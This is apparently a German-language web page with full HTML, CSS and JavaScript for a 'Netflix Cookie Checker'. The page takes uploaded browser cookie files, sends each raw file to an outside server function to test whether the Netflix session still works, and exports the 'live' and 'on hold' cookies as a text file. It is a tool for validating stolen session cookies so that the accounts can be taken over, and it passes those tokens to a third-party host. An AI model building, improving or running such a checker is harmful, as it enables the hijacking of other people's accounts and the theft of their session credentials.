# officiaIproject.github.io
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix Cookie Checker</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');

*{margin:0;padding:0;box-sizing:border-box}

body{
  background:#080808;
  font-family:'Inter',sans-serif;
  color:#fff;
  min-height:100vh;
}

/* glow hintergrund */
body::before{
  content:'';
  position:fixed;
  top:-300px;left:50%;transform:translateX(-50%);
  width:900px;height:600px;
  background:radial-gradient(ellipse,rgba(229,9,20,.12) 0%,transparent 65%);
  pointer-events:none;z-index:0;
}

.wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:48px 20px 100px}

/* ── HEADER ── */
.hdr{text-align:center;margin-bottom:48px}
.hdr-logo{display:inline-flex;align-items:center;gap:14px;margin-bottom:10px}
.hdr-n{
  font-size:2.4rem;font-weight:900;letter-spacing:-1px;
  background:linear-gradient(135deg,#e50914,#ff5555);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
}
.hdr-sub{color:#555;font-size:.85rem;letter-spacing:.5px}

/* ── STATS ── */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:28px}
.stat{
  background:#0f0f0f;border:1px solid #1a1a1a;border-radius:14px;
  padding:18px 16px;text-align:center;transition:border-color .3s;
}
.stat.s-total {border-color:#222}
.stat.s-live  {border-color:rgba(0,200,83,.25)}
.stat.s-hold  {border-color:rgba(240,180,41,.25)}
.stat.s-dead  {border-color:rgba(229,9,20,.2)}
.stat-n{font-size:2.2rem;font-weight:800;line-height:1;margin-bottom:5px}
.stat.s-total .stat-n{color:#fff}
.stat.s-live  .stat-n{color:#00c853}
.stat.s-hold  .stat-n{color:#f0b429}
.stat.s-dead  .stat-n{color:#e50914}
.stat-l{font-size:.7rem;color:#555;text-transform:uppercase;letter-spacing:1.2px;font-weight:600}

/* ── DROP ZONE ── */
.drop{
  background:#0f0f0f;border:2px dashed #252525;border-radius:18px;
  padding:52px 32px;text-align:center;cursor:pointer;
  transition:all .25s;margin-bottom:20px;position:relative;overflow:hidden;
}
.drop::after{
  content:'';position:absolute;inset:0;
  background:radial-gradient(ellipse at 50% 0%,rgba(229,9,20,.06),transparent 60%);
  opacity:0;transition:opacity .25s;pointer-events:none;
}
.drop:hover,.drop.over{border-color:#e50914;background:#111}
.drop:hover::after,.drop.over::after{opacity:1}
.drop input{display:none}
.drop-ic{font-size:2.8rem;margin-bottom:14px;display:block;transition:transform .2s}
.drop:hover .drop-ic{transform:scale(1.1)}
.drop-t{font-size:1.05rem;font-weight:600;color:#ccc;margin-bottom:6px}
.drop-s{font-size:.82rem;color:#444}

/* ── BUTTONS ── */
.btns{display:flex;gap:10px;margin-bottom:26px}
.btn{
  padding:13px 26px;border-radius:10px;border:none;
  font-size:.88rem;font-weight:700;cursor:pointer;
  font-family:'Inter',sans-serif;display:flex;align-items:center;gap:8px;transition:all .2s;
}
.btn-run{background:#e50914;color:#fff;flex:1}
.btn-run:hover:not(:disabled){background:#c00812;transform:translateY(-1px)}
.btn-run:disabled{background:#2a0507;color:#5a1015;cursor:not-allowed;transform:none}
.btn-clr{background:#141414;color:#777;border:1px solid #222}
.btn-clr:hover{background:#1a1a1a;color:#aaa}
.btn-exp{background:#091a10;color:#00c853;border:1px solid rgba(0,200,83,.2)}
.btn-exp:hover:not(:disabled){background:#0d2018}
.btn-exp:disabled{background:#0f0f0f;color:#2a2a2a;border-color:#1a1a1a;cursor:not-allowed}

/* ── PROGRESS ── */
.prog{display:none;margin-bottom:24px}
.prog.on{display:block}
.prog-top{display:flex;justify-content:space-between;font-size:.78rem;color:#555;margin-bottom:7px}
.prog-bar{height:3px;background:#1a1a1a;border-radius:2px;overflow:hidden}
.prog-fill{height:100%;background:linear-gradient(90deg,#e50914,#ff6b6b);transition:width .3s;width:0%}

/* ── FILTER TABS ── */
.res-top{display:none;justify-content:space-between;align-items:center;margin-bottom:14px}
.res-top.on{display:flex}
.res-label{font-size:.72rem;color:#444;text-transform:uppercase;letter-spacing:1.5px;font-weight:600}
.tabs{display:flex;gap:6px}
.tab{
  padding:5px 14px;border-radius:20px;border:1px solid #222;
  background:transparent;color:#555;font-size:.76rem;font-weight:600;
  cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif;
}
.tab:hover{border-color:#333;color:#999}
.tab.on       {background:#1c1c1c;color:#fff;border-color:#333}
.tab.on.t-live{background:rgba(0,200,83,.1);color:#00c853;border-color:rgba(0,200,83,.3)}
.tab.on.t-hold{background:rgba(240,180,41,.1);color:#f0b429;border-color:rgba(240,180,41,.3)}
.tab.on.t-dead{background:rgba(229,9,20,.1);color:#e50914;border-color:rgba(229,9,20,.25)}

/* ── CARDS ── */
.list{display:flex;flex-direction:column;gap:9px}

.card{
  background:#0f0f0f;border:1px solid #1c1c1c;border-radius:13px;
  padding:15px 18px;display:flex;align-items:center;gap:14px;
  animation:fadeUp .25s ease;transition:background .2s;
}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.card:hover{background:#121212}
.card.c-live {border-left:3px solid #00c853}
.card.c-hold {border-left:3px solid #f0b429}
.card.c-dead {border-left:3px solid #e50914}
.card.c-wait {border-left:3px solid #2a2a2a}

.dot{
  width:34px;height:34px;border-radius:50%;flex-shrink:0;
  display:flex;align-items:center;justify-content:center;font-size:1rem;font-weight:700;
}
.dot.d-live{background:rgba(0,200,83,.12);color:#00c853}
.dot.d-hold{background:rgba(240,180,41,.12);color:#f0b429}
.dot.d-dead{background:rgba(229,9,20,.1);color:#e50914}
.dot.d-wait{background:#1a1a1a;color:#555}

.ci{flex:1;min-width:0}
.ci-name{font-size:.9rem;font-weight:600;color:#ddd;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px}
.ci-reason{font-size:.76rem;color:#444;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

.badge{
  padding:4px 12px;border-radius:20px;font-size:.75rem;
  font-weight:800;letter-spacing:.8px;flex-shrink:0;
}
.b-live{background:rgba(0,200,83,.12);color:#00c853;border:1px solid rgba(0,200,83,.25)}
.b-hold{background:rgba(240,180,41,.1);color:#f0b429;border:1px solid rgba(240,180,41,.3)}
.b-dead{background:rgba(229,9,20,.1);color:#e50914;border:1px solid rgba(229,9,20,.2)}
.b-wait{background:#161616;color:#555;border:1px solid #222}

.empty{text-align:center;padding:64px 20px;color:#333}
.empty span{display:block;font-size:2.8rem;margin-bottom:14px}
.empty p{font-size:.88rem}

.spin{display:inline-block;animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── TOAST ── */
.toast{
  position:fixed;bottom:28px;left:50%;
  transform:translateX(-50%) translateY(80px);
  background:#181818;border:1px solid #282828;border-radius:10px;
  padding:11px 20px;font-size:.85rem;color:#ccc;
  z-index:999;transition:transform .3s;white-space:nowrap;pointer-events:none;
}
.toast.show{transform:translateX(-50%) translateY(0)}

@media(max-width:600px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .btns{flex-wrap:wrap}
  .btn-run{min-width:100%}
}
</style>
</head>
<body>
<div class="wrap">

  <!-- Header -->
  <div class="hdr">
    <div class="hdr-logo">
      <span style="font-size:2.6rem;filter:drop-shadow(0 0 20px rgba(229,9,20,.7))">🎬</span>
      <span class="hdr-n">Netflix Cookie Checker</span>
    </div>
    <p class="hdr-sub">Echter Server-Check · Kein Browser nötig</p>
  </div>

  <!-- Stats -->
  <div class="stats">
    <div class="stat s-total"><div class="stat-n" id="sTotal">0</div><div class="stat-l">Gesamt</div></div>
    <div class="stat s-live"> <div class="stat-n" id="sLive">0</div> <div class="stat-l">✓ Live</div></div>
    <div class="stat s-hold"> <div class="stat-n" id="sHold">0</div> <div class="stat-l">💳 On Hold</div></div>
    <div class="stat s-dead"> <div class="stat-n" id="sDead">0</div> <div class="stat-l">✕ Dead</div></div>
  </div>

  <!-- Drop Zone -->
  <div class="drop" id="drop" onclick="document.getElementById('fi').click()">
    <input type="file" id="fi" multiple accept=".txt,.cookies,.netscape,*">
    <span class="drop-ic">🍪</span>
    <div class="drop-t">Dateien hier ablegen oder klicken</div>
    <div class="drop-s">.txt · .cookies · Netscape Format</div>
  </div>

  <!-- Buttons -->
  <div class="btns">
    <button class="btn btn-run" id="btnRun" disabled onclick="run()">▶ &nbsp;Checker starten</button>
    <button class="btn btn-clr" onclick="clearAll()">✕ Leeren</button>
    <button class="btn btn-exp" id="btnExp" disabled onclick="exportResults()">↓ Live / Hold exportieren</button>
  </div>

  <!-- Progress -->
  <div class="prog" id="prog">
    <div class="prog-top"><span id="progTxt">...</span><span id="progPct">0%</span></div>
    <div class="prog-bar"><div class="prog-fill" id="progFill"></div></div>
  </div>

  <!-- Results header -->
  <div class="res-top" id="resTop">
    <span class="res-label">Ergebnisse</span>
    <div class="tabs">
      <button class="tab on"      onclick="filter('all',  this)">Alle</button>
      <button class="tab t-live"  onclick="filter('live', this)">Live</button>
      <button class="tab t-hold"  onclick="filter('hold', this)">On Hold</button>
      <button class="tab t-dead"  onclick="filter('dead', this)">Dead</button>
    </div>
  </div>

  <!-- List -->
  <div class="list" id="list">
    <div class="empty"><span>📂</span><p>Cookie-Dateien hinzufügen um zu starten</p></div>
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
const API = 'https://superagent-a2ae4512.base44.app/functions/checkNetflixCookie';

let items = [];
let curFilter = 'all';
let running = false;

// ── Drag & Drop ──────────────────────────────────────────────
const drop = document.getElementById('drop');
drop.addEventListener('dragover',  e => { e.preventDefault(); drop.classList.add('over'); });
drop.addEventListener('dragleave', () => drop.classList.remove('over'));
drop.addEventListener('drop', e => { e.preventDefault(); drop.classList.remove('over'); loadFiles([...e.dataTransfer.files]); });
document.getElementById('fi').addEventListener('change', e => { loadFiles([...e.target.files]); e.target.value=''; });

function loadFiles(files) {
  files.forEach(f => {
    const r = new FileReader();
    r.onload = e => addItem(e.target.result, f.name);
    r.readAsText(f);
  });
}

function addItem(raw, name) {
  items.push({ id: Math.random(), name, raw, status: 'pending', reason: '', plan: '' });
  refreshUI();
  toast(`✓ ${name} hinzugefügt`);
}

// ── Checker ──────────────────────────────────────────────────
async function run() {
  if (running) return;
  running = true;
  const btn = document.getElementById('btnRun');
  btn.disabled = true;
  btn.innerHTML = '<span class="spin">⟳</span> &nbsp;Läuft...';

  items.forEach(i => { i.status = 'checking'; i.reason = ''; i.plan = ''; });
  document.getElementById('prog').classList.add('on');

  for (let idx = 0; idx < items.length; idx++) {
    const it = items[idx];
    setProgress(idx, items.length, it.name);
    render();

    try {
      const res = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookieRaw: it.raw })
      });
      const d = await res.json();
      it.status = d.status || 'dead';
      it.reason = d.reason || '';
      it.plan   = d.plan   || '';
    } catch(e) {
      it.status = 'dead';
      it.reason = 'Verbindungsfehler';
    }

    refreshUI();
    await sleep(250);
  }

  setProgress(items.length, items.length, 'Fertig!');
  await sleep(500);
  document.getElementById('prog').classList.remove('on');

  btn.innerHTML = '▶ &nbsp;Erneut prüfen';
  btn.disabled = false;
  running = false;

  const live = items.filter(i => i.status === 'live').length;
  const hold = items.filter(i => i.status === 'hold' || i.status === 'onhold').length;
  const dead = items.filter(i => i.status === 'dead').length;
  if (live + hold > 0) document.getElementById('btnExp').disabled = false;
  toast(`✅ ${live} Live · 💳 ${hold} On Hold · ✕ ${dead} Dead`);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function setProgress(cur, total, label) {
  const pct = total ? Math.round(cur/total*100) : 100;
  document.getElementById('progFill').style.width = pct + '%';
  document.getElementById('progPct').textContent  = pct + '%';
  document.getElementById('progTxt').textContent  = cur < total ? `Prüfe: ${label}` : 'Fertig!';
}

// ── UI ───────────────────────────────────────────────────────
function refreshUI() {
  updateStats();
  render();
  document.getElementById('btnRun').disabled = items.length === 0;
  document.getElementById('resTop').className = 'res-top' + (items.length ? ' on' : '');
}

function updateStats() {
  document.getElementById('sTotal').textContent = items.length;
  document.getElementById('sLive').textContent  = items.filter(i => i.status === 'live').length;
  document.getElementById('sHold').textContent  = items.filter(i => i.status === 'hold' || i.status === 'onhold').length;
  document.getElementById('sDead').textContent  = items.filter(i => i.status === 'dead').length;
}

function filter(f, el) {
  curFilter = f;
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
  el.classList.add('on');
  render();
}

function render() {
  const list = document.getElementById('list');
  if (!items.length) {
    list.innerHTML = '<div class="empty"><span>📂</span><p>Cookie-Dateien hinzufügen um zu starten</p></div>';
    return;
  }

  const filtered = items.filter(i => {
    if (curFilter === 'all')  return true;
    if (curFilter === 'live') return i.status === 'live';
    if (curFilter === 'hold') return i.status === 'hold' || i.status === 'onhold';
    if (curFilter === 'dead') return i.status === 'dead';
    return true;
  });

  if (!filtered.length) {
    list.innerHTML = '<div class="empty"><span>🔍</span><p>Keine Einträge für diesen Filter</p></div>';
    return;
  }

  list.innerHTML = filtered.map(i => {
    const s = (i.status === 'onhold') ? 'hold' : i.status;
    const cfg = {
      live:     { card:'c-live', dot:'d-live', icon:'✓',  badge:'b-live', label:'LIVE'     },
      hold:     { card:'c-hold', dot:'d-hold', icon:'💳', badge:'b-hold', label:'ON HOLD'  },
      dead:     { card:'c-dead', dot:'d-dead', icon:'✕',  badge:'b-dead', label:'DEAD'     },
      checking: { card:'c-wait', dot:'d-wait', icon:'<span class="spin">⟳</span>', badge:'b-wait', label:'CHECK...' },
      pending:  { card:'c-wait', dot:'d-wait', icon:'…',  badge:'b-wait', label:'WARTE'    },
    }[s] || { card:'c-wait', dot:'d-wait', icon:'?', badge:'b-wait', label:'?' };

    const reason = esc(i.reason || (i.status === 'pending' ? 'Wartet auf Prüfung...' : ''));
    const planTag = i.plan && s === 'live'
      ? `<span style="color:#00c853;font-size:.72rem;margin-top:2px;display:block">📺 ${esc(i.plan)}</span>`
      : i.plan && s === 'hold'
      ? `<span style="color:#f0b429;font-size:.72rem;margin-top:2px;display:block">💳 Zahlung fällig</span>`
      : '';

    return `<div class="card ${cfg.card}">
      <div class="dot ${cfg.dot}">${cfg.icon}</div>
      <div class="ci">
        <div class="ci-name">📄 ${esc(i.name)}</div>
        <div class="ci-reason">${reason}</div>
        ${planTag}
      </div>
      <span class="badge ${cfg.badge}">${cfg.label}</span>
    </div>`;
  }).join('');
}

function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function clearAll() {
  if (running) return;
  items = [];
  refreshUI();
  document.getElementById('btnExp').disabled = true;
  document.getElementById('prog').classList.remove('on');
  toast('Geleert');
}

function exportResults() {
  const good = items.filter(i => i.status === 'live' || i.status === 'hold' || i.status === 'onhold');
  if (!good.length) return;
  const txt = good.map(i => {
    const tag = (i.status === 'live') ? 'LIVE' : 'ON HOLD';
    return `# [${tag}] ${i.name}\n${i.raw}\n${'─'.repeat(60)}`;
  }).join('\n\n');
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([txt], { type: 'text/plain' }));
  a.download = `netflix_live_${new Date().toISOString().slice(0,10)}.txt`;
  a.click();
  toast(`↓ ${good.length} Cookie(s) exportiert`);
}

function toast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(t._tid);
  t._tid = setTimeout(() => t.classList.remove('show'), 3200);
}
</script>
</body>
</html>

